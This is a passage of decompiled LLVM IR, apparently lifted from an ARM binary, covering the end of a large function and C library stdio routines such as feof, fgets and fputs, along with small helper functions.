  store i32 %v0_11240, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %bb158, %dec_label_pc_11230
  store i32 %v3_10e74.pre-phi, i32* @r2, align 4
  %v1_11238 = load i32, i32* %r8.global-to-local, align 4
  %v4_11238 = mul i32 %v1_11238, 4
  %v5_11238 = add i32 %v4_11238, %v3_10e74.pre-phi
  store i32 %v5_11238, i32* %sb.global-to-local, align 4
  %v1_1123c = add i32 %v5_11238, -40
  %v2_1123c = inttoptr i32 %v1_1123c to i32*
  %v3_1123c = load i32, i32* %v2_1123c, align 4
  store i32 %v3_1123c, i32* %r5.global-to-local, align 4
  %v1_11240 = add i32 %v0_11240, -1
  store i32 %v1_11240, i32* %r3.global-to-local, align 4
  %v0_11244 = load i32, i32* %r7.global-to-local, align 4
  %v4_11244 = mul i32 %v1_11240, 4
  %v5_11244 = add i32 %v0_11244, %v4_11244
  store i32 %v5_11244, i32* %sl.global-to-local, align 4
  %v7_11248 = icmp eq i32 %v3_1123c, 8
  %v1_1124c = add i32 %v5_11244, 40
  %v2_1124c = inttoptr i32 %v1_1124c to i32*
  %v3_1124c = load i32, i32* %v2_1124c, align 4
  store i32 %v3_1124c, i32* @r0, align 4
  br i1 %v7_11248, label %dec_label_pc_11280, label %dec_label_pc_11254

dec_label_pc_11254:                               ; preds = %dec_label_pc_11234
  %v9_11254 = icmp eq i32 %v3_1124c, %v3_1123c
  br i1 %v9_11254, label %dec_label_pc_11278, label %bb159

bb159:                                            ; preds = %dec_label_pc_11254
  %v8_11258 = icmp eq i32 %v3_1124c, 8
  br i1 %v8_11258, label %dec_label_pc_11278, label %dec_label_pc_11260

dec_label_pc_11260:                               ; preds = %bb159
  %v0_11260 = call i32 @_promoted_size()
  %v0_11268 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11268, i32* @r0, align 4
  %v0_1126c = call i32 @_promoted_size()
  store i32 %v0_1126c, i32* %r0.global-to-local, align 4
  %v8_11274 = icmp sgt i32 %v0_11260, %v0_1126c
  br i1 %v8_11274, label %dec_label_pc_11280, label %dec_label_pc_11260.dec_label_pc_11278_crit_edge

dec_label_pc_11260.dec_label_pc_11278_crit_edge:  ; preds = %dec_label_pc_11260
  %v0_11278.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_1127c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_11260.dec_label_pc_11278_crit_edge, %dec_label_pc_11254, %bb159
  %v1_1127c = phi i32 [ %v1_1127c.pre, %dec_label_pc_11260.dec_label_pc_11278_crit_edge ], [ %v5_11244, %dec_label_pc_11254 ], [ %v5_11244, %bb159 ]
  %v0_11278 = phi i32 [ %v0_11278.pre, %dec_label_pc_11260.dec_label_pc_11278_crit_edge ], [ %v5_11238, %dec_label_pc_11254 ], [ %v5_11238, %bb159 ]
  %v1_11278 = add i32 %v0_11278, -40
  %v2_11278 = inttoptr i32 %v1_11278 to i32*
  %v3_11278 = load i32, i32* %v2_11278, align 4
  store i32 %v3_11278, i32* %r3.global-to-local, align 4
  %v2_1127c = add i32 %v1_1127c, 40
  %v3_1127c = inttoptr i32 %v2_1127c to i32*
  store i32 %v3_11278, i32* %v3_1127c, align 4
  br label %dec_label_pc_11280

dec_label_pc_11280:                               ; preds = %dec_label_pc_11260, %dec_label_pc_11234, %dec_label_pc_11278
  %v0_11280 = load i32, i32* %r7.global-to-local, align 4
  %v1_11280 = add i32 %v0_11280, 28
  %v2_11280 = inttoptr i32 %v1_11280 to i32*
  %v3_11280 = load i32, i32* %v2_11280, align 4
  %v0_11284 = load i32, i32* %r8.global-to-local, align 4
  %v1_11284 = add i32 %v0_11284, 1
  store i32 %v1_11284, i32* %r8.global-to-local, align 4
  %v1_11288 = add i32 %v3_11280, 2
  store i32 %v1_11288, i32* %r3.global-to-local, align 4
  %v6_11290 = icmp slt i32 %v1_11284, %v1_11288
  br i1 %v6_11290, label %dec_label_pc_111f8, label %dec_label_pc_112b4

dec_label_pc_11298:                               ; preds = %dec_label_pc_111ec
  %v0_11298 = load i32, i32* %r7.global-to-local, align 4
  %v1_11298 = add i32 %v0_11298, 28
  %v2_11298 = inttoptr i32 %v1_11298 to i32*
  %v3_11298 = load i32, i32* %v2_11298, align 4
  store i32 %v3_11298, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_112a0 = add i32 %v0_11298, 38
  %v4_112a0 = inttoptr i32 %v3_112a0 to i8*
  store i8 1, i8* %v4_112a0, align 1
  %v0_112a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_112a4 = mul i32 %v0_112a4, 4
  store i32 %v3_112a4, i32* @r2, align 4
  %v0_112a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_112a8 = add i32 %v0_112a8, 40
  store i32 %v1_112a8, i32* @r0, align 4
  %v2_112ac = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_112ac, i32* @r1, align 4
  %v0_112b0 = call i32 @memcpy()
  store i32 %v0_112b0, i32* %r0.global-to-local, align 4
  %v0_112b4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_112b4

dec_label_pc_112b4:                               ; preds = %dec_label_pc_11280, %dec_label_pc_11298
  %v2_112d0 = phi i32 [ %v0_112b4.pre, %dec_label_pc_11298 ], [ %v0_11280, %dec_label_pc_11280 ]
  %v1_112b4 = add i32 %v2_112d0, 16
  %v2_112b4 = inttoptr i32 %v1_112b4 to i32*
  %v3_112b4 = load i32, i32* %v2_112b4, align 4
  store i32 %v3_112b4, i32* %r3.global-to-local, align 4
  %v1_112b8 = and i32 %v3_112b4, 128
  %v2_112b8 = icmp eq i32 %v1_112b8, 0
  br i1 %v2_112b8, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_112b4
  %v3_112bc = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_112bc, i32* %r3.global-to-local, align 4
  %v2_112c0 = inttoptr i32 %v2_112d0 to i32*
  %v3_112c0 = load i32, i32* %v2_112c0, align 4
  %v2_112c8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_112c8 = sub i32 %v2_112c8.pre, %v3_112bc
  store i32 %v3_112c8, i32* %r3.global-to-local, align 4
  %v5_112cc = mul i32 %v3_112c8, 4
  %v6_112cc = add i32 %v5_112cc, %v3_112c0
  store i32 %v6_112cc, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_112b4
  %v1_112c445 = load i32, i32* %r6.global-to-local, align 4
  %v2_112c446 = add i32 %v1_112c445, 1
  store i32 %v2_112c446, i32* %r3.global-to-local, align 4
  %v3_112d0 = inttoptr i32 %v2_112d0 to i32*
  store i32 %v2_112c446, i32* %v3_112d0, align 4
  %v0_112d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_112dc = phi i32 [ %v2_112d0, %.thread48 ], [ %v0_112d4.pre, %.thread50 ]
  %v1_112d4 = add i32 %v1_112dc, 28
  %v2_112d4 = inttoptr i32 %v1_112d4 to i32*
  %v3_112d4 = load i32, i32* %v2_112d4, align 4
  store i32 %v3_112d4, i32* %r3.global-to-local, align 4
  %v1_112d8 = add i32 %v3_112d4, 2
  store i32 %v1_112d8, i32* %r0.global-to-local, align 4
  %v0_112dc = load i32, i32* %fp.global-to-local, align 4
  %v2_112dc = add i32 %v1_112dc, 24
  %v3_112dc = inttoptr i32 %v2_112dc to i32*
  store i32 %v0_112dc, i32* %v3_112dc, align 4
  br i1 %v2_112b8, label %dec_label_pc_112ec, label %bb161

bb161:                                            ; preds = %bb160
  %v1_112e0 = load i32, i32* @r2, align 4
  %v2_112e0 = load i32, i32* %r7.global-to-local, align 4
  %v3_112e0 = inttoptr i32 %v2_112e0 to i32*
  store i32 %v1_112e0, i32* %v3_112e0, align 4
  br label %dec_label_pc_112ec

dec_label_pc_112e8:                               ; preds = %dec_label_pc_111dc, %dec_label_pc_10dfc, %dec_label_pc_10f44, %dec_label_pc_10ff0, %dec_label_pc_10fc8, %dec_label_pc_10fd4, %dec_label_pc_10f10, %dec_label_pc_11228, %dec_label_pc_111a8, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %bb161, %bb160, %dec_label_pc_112e8
  %v2_112f0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_112f0, i32* @r4, align 4
  store i32 %v6_10db8, i32* @r5, align 4
  store i32 %v27_10db8, i32* @lr, align 4
  %v1_112f4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_112f4

; uselistorder directives
  uselistorder i32 %v3_112c8, { 1, 0 }
  uselistorder i32 %v1_11284, { 1, 2, 0 }
  uselistorder i32 %v2_11220, { 1, 0 }
  uselistorder i32 %v1_11220, { 1, 0, 2 }
  uselistorder i32 %v0_11240, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_11218, { 0, 2, 1, 3 }
  uselistorder i32 %v1_111dc, { 1, 2, 0 }
  uselistorder i32 %v0_111cc, { 1, 0 }
  uselistorder i32 %v1_111a8, { 1, 0, 2 }
  uselistorder i32 %v1_1111c, { 1, 2, 0 }
  uselistorder i32 %v1_11104, { 1, 0 }
  uselistorder i32 %v2_110ec, { 2, 1, 0 }
  uselistorder i32 %v1_110d0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_110c8, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_110ac, { 1, 0, 2 }
  uselistorder i32 %v2_11094, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11088, { 2, 1, 0 }
  uselistorder i32 %v1_11048, { 0, 2, 3, 1 }
  uselistorder i32 %v0_11038.pre, { 0, 2, 1 }
  uselistorder i32 %v2_11014, { 1, 0 }
  uselistorder i32 %v5_10f74, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10f74, { 1, 0 }
  uselistorder i32 %v0_10f7876, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_10f1c, { 1, 0 }
  uselistorder i32 %v0_10f3c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10f00, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10ee8, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_10ed8, { 1, 0 }
  uselistorder i32 %v3_10ed0, { 0, 2, 1 }
  uselistorder i8 %v2_10ed0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10f50, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_10e94, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10e80, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10e68, { 1, 0 }
  uselistorder i32 %v3_10e74.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_10e1c, { 0, 2, 1 }
  uselistorder i32 %v2_10e08, { 1, 0, 2 }
  uselistorder i32 %v0_10dbc, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 19, 17, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 12, 13, 9, 11, 2, 3, 14, 4, 10, 5, 6, 7, 8, 0, 1, 16 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1 }
  uselistorder i32 3856, { 1, 2, 0, 3 }
  uselistorder i32 -36924, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_112ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_112e8, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_112b4, { 1, 0 }
  uselistorder label %dec_label_pc_11280, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11278, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11234, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_111ec, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11000, { 1, 0 }
  uselistorder label %dec_label_pc_10fb4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10f30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f2c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10ecc, { 1, 0 }
  uselistorder label %dec_label_pc_10ec8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ecc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10e6c, { 1, 0 }
  uselistorder label %dec_label_pc_10e40, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_11328 = load i32, i32* @r4, align 4
  store i32 %v3_11328, i32* %stack_var_-20, align 4
  %v2_1132c = add i32 %tmp, 52
  %v3_1132c = inttoptr i32 %v2_1132c to i32*
  %v4_1132c = load i32, i32* %v3_1132c, align 4
  store i32 87428, i32* %r5.global-to-local, align 4
  %v1_11334 = sub i32 1, %v4_1132c
  %v2_11334 = icmp ult i32 %v4_1132c, 2
  br i1 %v2_11334, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_11334, %entry ]
  %v0_1133c = phi i32 [ 0, %bb ], [ %v1_11334, %entry ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_1133c = icmp eq i32 %v0_1133c, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_1133c, label %dec_label_pc_11388, label %dec_label_pc_11350

dec_label_pc_11350:                               ; preds = %thread-pre-split
  %v2_11354 = add i32 %tmp, 56
  store i32 %v2_11354, i32* %r4.global-to-local, align 4
  %v4_11368 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11368)
  %v0_1137c = load i32, i32* %r5.global-to-local, align 4
  %v2_1137c = add i32 %v0_1137c, 16
  %v3_1137c = inttoptr i32 %v2_1137c to i32*
  %v4_1137c = load i32, i32* %v3_1137c, align 4
  store i32 %v4_1137c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1137c)
  %v0_11388.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1138c.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_11388.pre, 0
  br label %dec_label_pc_11388

dec_label_pc_11388:                               ; preds = %thread-pre-split, %dec_label_pc_11350
  %v0_1138c = phi i32 [ %tmp, %thread-pre-split ], [ %v0_1138c.pre, %dec_label_pc_11350 ]
  %v0_11388 = phi i1 [ true, %thread-pre-split ], [ %phitmp, %dec_label_pc_11350 ]
  %v1_1138c = inttoptr i32 %v0_1138c to i16*
  %v2_1138c = load i16, i16* %v1_1138c, align 2
  %v3_1138c = zext i16 %v2_1138c to i32
  store i32 %v3_1138c, i32* %r4.global-to-local, align 4
  br i1 %v0_11388, label %dec_label_pc_11388..thread4_crit_edge, label %bb15

dec_label_pc_11388..thread4_crit_edge:            ; preds = %dec_label_pc_11388
  %v0_113a4.pre = load i32, i32* @ip, align 4
  br label %.thread4

bb15:                                             ; preds = %dec_label_pc_11388
  %v1_1139c = load i32, i32* %r5.global-to-local, align 4
  %v3_1139c = add i32 %v1_1139c, 24
  %v4_1139c = inttoptr i32 %v3_1139c to i32*
  %v5_1139c = load i32, i32* %v4_1139c, align 4
  store i32 %v5_1139c, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11388..thread4_crit_edge, %bb15
  %v0_113a4 = phi i32 [ %v0_113a4.pre, %dec_label_pc_11388..thread4_crit_edge ], [ %v5_1139c, %bb15 ]
  %v2_113a4 = xor i1 %v0_11388, true
  call void @__pseudo_cond_branch(i1 %v2_113a4, i32 %v0_113a4)
  %v0_113a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_113a8 = and i32 %v0_113a8, 4
  %v2_113b0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_113b0, i32* @r4, align 4
  ret i32 %v1_113a8

; uselistorder directives
  uselistorder i1 %v0_11388, { 1, 0 }
  uselistorder i32 %v1_11334, { 1, 0 }
  uselistorder i32 %v4_1132c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_11388, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_113bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_113bc:
  %v0_113bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_113bc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_113bc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_113bc, %bb
  %v10_113c8 = phi i32 [ %arg1, %dec_label_pc_113bc ], [ 0, %bb ]
  ret i32 %v10_113c8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_113cc = load i32, i32* @r4, align 4
  store i32 %v3_113cc, i32* %stack_var_-28, align 4
  %v6_113cc = load i32, i32* @r5, align 4
  %v9_113cc = load i32, i32* @r6, align 4
  %v12_113cc = load i32, i32* @r7, align 4
  %v21_113cc = load i32, i32* @lr, align 4
  %v1_113d0 = add i32 %arg3, 52
  %v2_113d0 = inttoptr i32 %v1_113d0 to i32*
  %v3_113d0 = load i32, i32* %v2_113d0, align 4
  %v1_113d8 = sub i32 1, %v3_113d0
  %v2_113d8 = icmp ult i32 %v3_113d0, 2
  br i1 %v2_113d8, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_113d8, %entry ]
  %v0_113e0 = phi i32 [ 0, %bb ], [ %v1_113d8, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_113e0 = icmp eq i32 %v0_113e0, 0
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_113e0, label %dec_label_pc_11434, label %dec_label_pc_113fc

dec_label_pc_113fc:                               ; preds = %bb16
  %v1_11400 = add i32 %arg3, 56
  store i32 %v1_11400, i32* @r4, align 4
  %v4_11414 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11414)
  %v0_11428 = load i32, i32* @r5, align 4
  %v2_11428 = add i32 %v0_11428, 16
  %v3_11428 = inttoptr i32 %v2_11428 to i32*
  %v4_11428 = load i32, i32* %v3_11428, align 4
  store i32 %v4_11428, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11434.659 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11428)
  %v0_11434.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11438.pre = load i32, i32* @r7, align 4
  %v0_1143c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %bb16, %dec_label_pc_113fc
  %v0_1143c = phi i32 [ %arg3, %bb16 ], [ %v0_1143c.pre, %dec_label_pc_113fc ]
  %v0_11438 = phi i32 [ %arg2, %bb16 ], [ %v0_11438.pre, %dec_label_pc_113fc ]
  %v0_11434 = phi i32 [ %arg1, %bb16 ], [ %v0_11434.pre, %dec_label_pc_113fc ]
  %v3_11440 = inttoptr i32 %v0_11434 to i8*
  %v4_11440 = call i32 @__GI_fgets_unlocked(i8* %v3_11440, i32 %v0_11438, i32 %v0_1143c)
  %v0_11444 = load i32, i32* %sl.global-to-local, align 4
  %v2_11444 = icmp eq i32 %v0_11444, 0
  store i32 %v4_11440, i32* %r4.global-to-local, align 4
  br i1 %v2_11444, label %dec_label_pc_11434..thread3_crit_edge, label %bb17

dec_label_pc_11434..thread3_crit_edge:            ; preds = %dec_label_pc_11434
  %v0_11460.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_11434
  %v1_11458 = load i32, i32* @r5, align 4
  %v3_11458 = add i32 %v1_11458, 24
  %v4_11458 = inttoptr i32 %v3_11458 to i32*
  %v5_11458 = load i32, i32* %v4_11458, align 4
  store i32 %v5_11458, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11434..thread3_crit_edge, %bb17
  %v0_11460 = phi i32 [ %v0_11460.pre, %dec_label_pc_11434..thread3_crit_edge ], [ %v5_11458, %bb17 ]
  %v2_11460 = xor i1 %v2_11444, true
  call void @__pseudo_cond_branch(i1 %v2_11460, i32 %v0_11460)
  %v0_11464 = load i32, i32* %r4.global-to-local, align 4
  %v2_1146c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1146c, i32* @r4, align 4
  store i32 %v6_113cc, i32* @r5, align 4
  store i32 %v9_113cc, i32* @r6, align 4
  store i32 %v12_113cc, i32* @r7, align 4
  store i32 %v21_113cc, i32* @lr, align 4
  ret i32 %v0_11464

; uselistorder directives
  uselistorder i32 %v3_113d0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_11434, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_11478(i32 %arg1) local_unnamed_addr {
dec_label_pc_11478:
  %v0_11478 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11478, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11478
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11478, %bb
  %v10_11484 = phi i32 [ %arg1, %dec_label_pc_11478 ], [ 0, %bb ]
  ret i32 %v10_11484

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11488 = load i32, i32* @r4, align 4
  store i32 %v3_11488, i32* %stack_var_-24, align 4
  %v6_11488 = load i32, i32* @r5, align 4
  %v9_11488 = load i32, i32* @r6, align 4
  %v12_11488 = load i32, i32* @r7, align 4
  %v15_11488 = load i32, i32* @r8, align 4
  %v18_11488 = load i32, i32* @lr, align 4
  %v1_1148c = add i32 %arg2, 52
  %v2_1148c = inttoptr i32 %v1_1148c to i32*
  %v3_1148c = load i32, i32* %v2_1148c, align 4
  %v1_11494 = sub i32 1, %v3_1148c
  %v2_11494 = icmp ult i32 %v3_1148c, 2
  br i1 %v2_11494, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_11494, %entry ]
  %v0_1149c = phi i32 [ 0, %bb ], [ %v1_11494, %entry ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_1149c = icmp eq i32 %v0_1149c, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_1149c, label %dec_label_pc_114ec, label %dec_label_pc_114b4

dec_label_pc_114b4:                               ; preds = %thread-pre-split
  %v1_114b8 = add i32 %arg2, 56
  store i32 %v1_114b8, i32* @r4, align 4
  %v4_114cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_114cc)
  %v0_114e0 = load i32, i32* @r5, align 4
  %v2_114e0 = add i32 %v0_114e0, 16
  %v3_114e0 = inttoptr i32 %v2_114e0 to i32*
  %v4_114e0 = load i32, i32* %v3_114e0, align 4
  store i32 %v4_114e0, i32* @ip, align 4
  store i32 70892, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_114e0)
  %v0_114ec.pre = load i32, i32* @r7, align 4
  %v0_114f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %thread-pre-split, %dec_label_pc_114b4
  %v0_114f0 = phi i32 [ %arg2, %thread-pre-split ], [ %v0_114f0.pre, %dec_label_pc_114b4 ]
  %v0_114ec = phi i32 [ %arg1, %thread-pre-split ], [ %v0_114ec.pre, %dec_label_pc_114b4 ]
  %v2_114f4 = inttoptr i32 %v0_114ec to i8*
  %v3_114f4 = call i32 @__GI_fputs_unlocked(i8* %v2_114f4, i32 %v0_114f0)
  %v0_114f8 = load i32, i32* @r8, align 4
  %v2_114f8 = icmp eq i32 %v0_114f8, 0
  store i32 %v3_114f4, i32* %r4.global-to-local, align 4
  br i1 %v2_114f8, label %dec_label_pc_114ec..thread6_crit_edge, label %bb16

dec_label_pc_114ec..thread6_crit_edge:            ; preds = %dec_label_pc_114ec
  br label %.thread6

bb16:                                             ; preds = %dec_label_pc_114ec
  %v1_1150c = load i32, i32* @r5, align 4
  %v3_1150c = add i32 %v1_1150c, 24
  %v4_1150c = inttoptr i32 %v3_1150c to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_114ec..thread6_crit_edge, %bb16
  %v0_11514.in = phi i32* [ @ip, %dec_label_pc_114ec..thread6_crit_edge ], [ %v4_1150c, %bb16 ]
  %v0_11514 = load i32, i32* %v0_11514.in, align 4
  %v2_11514 = xor i1 %v2_114f8, true
  call void @__pseudo_cond_branch(i1 %v2_11514, i32 %v0_11514)
  %v0_11518 = load i32, i32* %r4.global-to-local, align 4
  %v2_11520 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11520, i32* @r4, align 4
  store i32 %v6_11488, i32* @r5, align 4
  store i32 %v9_11488, i32* @r6, align 4
  store i32 %v12_11488, i32* @r7, align 4
  store i32 %v15_11488, i32* @r8, align 4
  store i32 %v18_11488, i32* @lr, align 4
  ret i32 %v0_11518

; uselistorder directives
  uselistorder i32 %v1_11494, { 1, 0 }
  uselistorder i32 %v3_1148c, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_114ec, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_1152c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1152c:
  %v0_1152c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1152c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1152c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1152c, %bb
  %v10_11538 = phi i32 [ %arg1, %dec_label_pc_1152c ], [ 0, %bb ]
  ret i32 %v10_11538

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
